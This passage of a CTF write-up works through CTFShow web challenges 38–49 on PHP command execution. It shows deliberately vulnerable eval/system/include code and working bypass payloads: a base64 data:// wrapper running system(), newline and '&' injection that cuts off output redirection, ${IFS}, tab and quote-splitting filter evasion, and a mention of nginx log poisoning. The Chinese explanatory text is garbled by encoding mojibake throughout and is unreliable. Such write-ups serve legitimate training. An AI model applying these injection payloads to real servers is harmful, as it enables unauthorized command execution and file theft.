<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;tac flag.php&#x27;);<span class="meta">?&gt;</span> = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°flag.phpï¼š</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web38_1.png"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong><br>åˆ©ç”¨æ—¥å¿—æ–‡ä»¶å¾—åˆ°shellï¼Œæ—¥å¿—æ–‡ä»¶ç›®å½•: /var/log/nginx/access.log ä¸ web37 æ–¹æ³•äºŒç±»ä¼¼</p>
<h2 id="web39â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web39â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web39â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web39â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol>
<li>ä»ç„¶æ˜¯ data:// åè®®ï¼›ls ä¸‹ç›®å½•</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// passthru()</span></span><br><span class="line"><span class="comment">// echo exec()ï¼Œexec() é»˜è®¤å›æ˜¾æœ€åä¸€è¡Œï¼Œecho exec() å®Œæ•´æ˜¾ç¤º</span></span><br><span class="line"><span class="comment">// echo shell_exec() shell_exec()é»˜è®¤æ— æ˜¾ç¤ºï¼Œecho shell_exec() å¯æ˜¾ç¤º</span></span><br><span class="line"><span class="comment">// </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web39.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cat æ‰€æœ‰ få¼€å¤´çš„æ–‡ä»¶</span></span><br><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;cat f*&#x27;)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web39_1.png"></p>
<h2 id="web40â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web40â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web40â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web40â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº† [0-9]æ•°å­—ï¼Œ~ï¼ŒÂ·ï¼Œ@, #, $, ^, &amp;, *, ä¸­æ–‡æ‹¬å·ï¼ˆï¼‰ï¼Œ-, =, +, {},[], : , â€™ , â€œ, é€—å·, &lt; &gt;, å°æ•°ç‚¹, ./, ? ,ä¸€å¤§å †</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(localeconv());</span><br><span class="line"><span class="comment">// localeconv() è¿”å›åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„å…¶ä¸­åŒ…å«å°æ•°ç‚¹ï¼Œæ­£å¥½é¢˜ç›®è¿‡æ»¤äº†å°æ•°ç‚¹</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(pos(localeconv()));</span><br><span class="line"><span class="comment">// pos() è·å–æ•°ç»„ä¸­å½“å‰å…ƒç´ çš„å€¼---&gt; . </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_1.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv())));</span><br><span class="line"><span class="comment">// scandir() è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„---&gt; æ­¤æ—¶è·å–åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º 1 çš„ä¸º ..</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_2.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(array_reverse(scandir(pos(localeconv()))));</span><br><span class="line"><span class="comment">// array_reverse() ç¿»è½¬æ•°ç»„--&gt;å°† scandir() è·å–åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º 1 çš„å˜ä¸º flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_3.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=print_r(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"><span class="comment">// next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚å³ä¸‹ä¸€ä¸ª ---&gt; flag.phpï¼›å¦‚è‹¥åœ¨ä¸Šä¸€æ­¥array_reverse()ä¸ç¿»è½¬å°†å¾—åˆ°: ..</span></span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªæŠ¥é”™ä¸ç®¡å®ƒã€‚</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_4.png"></p>
<p>æ­¤æ—¶å·²ç»è¯»å–åˆ°äº† flag.php é‚£ä¹ˆå°±è¦å°†å…¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥: å¯ä»¥ä½¿ç”¨ show_source() æˆ–è€… highlight_file() å¾—åˆ° flagã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web40_5.png"></p>
<h2 id="web41â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web41â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web41â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web41â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><h2 id="web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-gt-dev-null-2-gt-amp-1"><a href="#web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-gt-dev-null-2-gt-amp-1" class="headerlink" title="web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” &gt;/dev/null 2&gt;&amp;1"></a>web42â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” &gt;/dev/null 2&gt;&amp;1</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> </span><br></pre></td></tr></table></figure>

<ol>
<li><blockquote>
<p>/dev/null<br>/dev/null ä½œç”¨æ˜¯å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° /dev/nullä¸­ã€‚/dev/nullä»£è¡¨Linuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œå¾€è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥çš„å†…å®¹éƒ½ä¼šä¸¢å¤±:â€œé»‘æ´â€ æ‰€ä»¥æ‰§è¡Œäº† &gt;/dev/null ä¹‹åï¼Œæ ‡å‡†è¾“å‡ºæ‰å…¥é»‘æ´ä¸å¤å­˜åœ¨ã€‚</p>
</blockquote>
</li>
<li><p>2&gt;&amp;1<br>é‡å®šå‘ç»‘å®šï¼Œ &amp; å¯ä»¥å°†ä¸¤ä¸ªè¾“å‡ºç»‘å®šåœ¨ä¸€èµ·ã€‚æ‰€ä»¥ é”™è¯¯è¾“å‡ºå°†å’Œæ ‡å‡†è¾“å‡ºåŒç”¨ä¸€ä¸ªæ–‡ä»¶æè¿°ã€‚<br>å› æ­¤ &gt;/dev/null 2&gt;&amp;1 æ‰§è¡Œåï¼šæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/nullä¸­(é»‘æ´),é”™è¯¯è¾“å‡ºé‡ç”¨æ¥æ ‡å‡†è¾“å‡ºçš„æè¿°ï¼Œå› æ­¤ä¹Ÿæ‰å…¥äº†é»‘æ´ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¡å‘½ä»¤ä¸ä¼šæœ‰ä»»ä½•æ˜¾ç¤ºï¼Œä¸ä¼šè¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°æ§åˆ¶å°ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•ä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚</p>
</li>
</ol>
<p>æ‰€ä»¥æ­¤é¢˜è¦æŠŠ &gt;/dev/null 2&gt;&amp;1 è¿™éƒ¨åˆ†å†…å®¹æˆªæ–­:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%<span class="number">0</span>a <span class="comment">// %0a = å›è½¦</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span> <span class="comment">// %26 = &amp;</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> <span class="comment">// %26%26 = &amp;&amp;</span></span><br><span class="line">?c=tac flag.php|| <span class="comment">// || = ||</span></span><br><span class="line">?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web42.png"></p>
<h2 id="web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web43â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº†å‘½ä»¤ <strong>cat</strong> å’Œ <strong>åˆ†å·</strong> ,å¯ä»¥ä½¿ç”¨ <strong>câ€™â€™at</strong> æˆ–è€… <strong>tac</strong> æˆ–è€… <strong>less/more</strong>(éœ€è¦æŸ¥çœ‹æºä»£ç ) æˆ–è€… <strong>tail</strong> æˆ–è€… <strong>nl(è¯»å–è¡Œå·æŸ¥çœ‹æºä»£ç )</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ca<span class="string">&#x27;&#x27;</span>t flag.php%<span class="number">0</span>a /%<span class="number">26</span> /||</span><br><span class="line">?c=tac flag.php%<span class="number">0</span>a /%<span class="number">26</span> /||</span><br><span class="line">?c=less flag.php%<span class="number">0</span>a /%<span class="number">26</span> /||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨ less flag.php%0a</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web43.png"></p>
<h2 id="web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web44â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº†ä¸€ä¸ª <strong>flag</strong>,å› æ­¤:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=cat f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=less f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=less f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=more f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=more f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tail f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tail f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web44.png"></p>
<h2 id="web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web45â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº† <strong>ç©ºæ ¼</strong>;å› æ­¤éœ€è¦ç»•è¿‡ç©ºæ ¼:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// %09:tab ä»£æ›¿ç©ºæ ¼</span></span><br><span class="line"><span class="comment">// $&#123;IFS&#125; ä»£æ›¿ç©ºæ ¼</span></span><br><span class="line">?c=tac%<span class="number">09</span>f*%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac$&#123;IFS&#125;%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>IFS : Internal Field Separator : å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦<br>$IFS é»˜è®¤ç©ºå­—ç¬¦(ç©ºæ ¼, tab, \n)</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web45.png"></p>
<h2 id="web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web46â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº† <strong>æ•°å­—</strong>ï¼Œ**$**, *****,å› æ­¤éœ€è¦ç»•è¿‡è¿™äº›:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;</span></span><br><span class="line"><span class="comment">// &lt;&gt; å‡å¯ä»£æ›¿ç©ºæ ¼</span></span><br><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web46.png"></p>
<h2 id="web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº† <strong>more, less, head, sort, tail</strong> å”¯ç‹¬è¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤ tac:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line"><span class="comment">// nl æ˜¾ç¤ºè¡Œå·ï¼Œéœ€è¦æŸ¥çœ‹æºä»£ç </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web47.png"></p>
<h2 id="web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç ;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>sed, cut, awk, strings, od, curl `</strong> è¿™äº›æ˜¯å•¥ç©æ„å„¿MD: è‡ªè¡Œç™¾åº¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=sor<span class="string">&#x27;&#x27;</span>t&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=hea<span class="string">&#x27;&#x27;</span>d&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | || <span class="comment">// headé»˜è®¤æ˜¾ç¤ºåè¡Œ</span></span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web48.png"></p>
<h2 id="web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>%</strong>: æ–¹æ³•åŒä¸Š</p>
